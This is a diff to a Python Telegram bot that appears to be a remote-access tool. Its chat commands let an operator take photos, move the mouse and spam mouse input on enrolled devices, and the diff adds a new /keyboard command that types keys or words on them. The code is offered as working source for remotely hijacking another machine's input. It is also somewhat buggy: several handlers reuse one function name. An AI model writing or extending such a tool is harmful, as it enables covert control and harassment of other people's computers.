@@ -62,9 +62,10 @@ def send_welcome(message):
         "/photo <device_id/all>\n"
         "/mouse <device_id/all> x y\n"
         "/mouse_spam <device_id/all>\n"
-        "/mouse_spam_stop <device_id/all>\n"\
+        "/mouse_spam_stop <device_id/all>\n"
+        "/keyboard <device_id/all> word/letter\n"
+        "/keyboard_spam <device_id/all> word/letter\n"
         "/keyboard_spam_stop <device_id/all>\n"
-        "/keyboard_spam <device_id/all> word\letter\n"
     )
 
 @bot.message_handler(commands=['mouse'])
@@ -82,10 +83,10 @@ def move_mousik(message):
         if target_id.lower() == 'all':
             for device_id in devices.keys():
                 pyautogui.moveTo(x, y)
-                bot.send_message(message.chat.id, f"Broadcast command executed on {devices[device_id]}")
+            bot.send_message(message.chat.id, f"mouse executed to all")
         elif target_id in devices:
             pyautogui.moveTo(x, y)
-            bot.send_message(message.chat.id, f"Command executed on {devices[target_id]}")
+            bot.send_message(message.chat.id, f"mouse executed on {devices[target_id]}")
         else:
             bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
     except Exception as e:
@@ -115,9 +116,11 @@ def move_mousik(message):
             for device_id in devices.keys():
                 mouse_spam = False
                 threading.Thread(target=mouse_movik, daemon=True).start()
+            bot.send_message(message.chat.id, f"mouse_spam executed to all")
         elif target_id in devices:
             mouse_spam = False
             threading.Thread(target=mouse_movik, daemon=True).start()
+            bot.send_message(message.chat.id, f"mouse_spam executed on {devices[target_id]}")
         else:
             bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
     except Exception as e:
@@ -137,8 +140,10 @@ def move_mousik(message):
         if target_id.lower() == 'all':
             for device_id in devices.keys():
                 mouse_spam = True
+            bot.send_message(message.chat.id, f"mouse_spam executed on all")
         elif target_id in devices:
             mouse_spam = True
+            bot.send_message(message.chat.id, f"mouse_spam was stopped on {devices[target_id]}")
         else:
             bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
     except Exception as e:
@@ -154,6 +159,40 @@ def Keyboardik(klavishi, lett):
             kb.press(klavishi)
         else:
             kb.write(klavishi, delay=0.1)
+
+@bot.message_handler(commands=['keyboard'])
+def move_mousik(message):
+    try:
+        args = message.text.split(' ')
+        if len(args) < 3:
+            bot.send_message(message.chat.id, "Usage: /keyboard <device_id/all word/letter")
+            return
+
+        target_id = args[1]
+        klavisha = str(args[2])
+
+        if len(klavisha) > 1:
+            letter = False
+        else:
+            letter = True
+
+        if target_id.lower() == 'all':
+            for device_id in devices.keys():
+                if letter == True:
+                    kb.press(klavisha)
+                else:
+                    kb.write(klavisha, delay=0.1)
+                bot.send_message(message.chat.id, f"keyboard executed on all")
+        elif target_id in devices:
+            if letter == True:
+                kb.press(klavisha)
+            else:
+                kb.write(klavisha, delay=0.1)
+            bot.send_message(message.chat.id, f"keyboard executed on {target_id}")
+        else:
+            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
 
 @bot.message_handler(commands=['keyboard_spam'])
 def move_mousik(message):
@@ -176,9 +215,11 @@ def move_mousik(message):
             for device_id in devices.keys():
                 keyboard_start = False
                 threading.Thread(target=Keyboardik, args=(klavisha, letter,), daemon=True).start()
+            bot.send_message(message.chat.id, f"keyboard_spam executed on all")
         elif target_id in devices:
             keyboard_start = False
             threading.Thread(target=Keyboardik, args=(klavisha, letter,), daemon=True).start()
+            bot.send_message(message.chat.id, f"keyboard_spam executed on {devices[target_id]}")
         else:
             bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
     except Exception as e:
@@ -198,8 +239,10 @@ def move_mousik(message):
         if target_id.lower() == 'all':
             for device_id in devices.keys():
                 keyboard_start = True
+            bot.send_message(message.chat.id, f"keyboard_spam was stopped to all")
         elif target_id in devices:
             keyboard_start = True
+            bot.send_message(message.chat.id, f"keyboard_spam was stopped to {target_id}")
         else:
             bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
     except Exception as e:
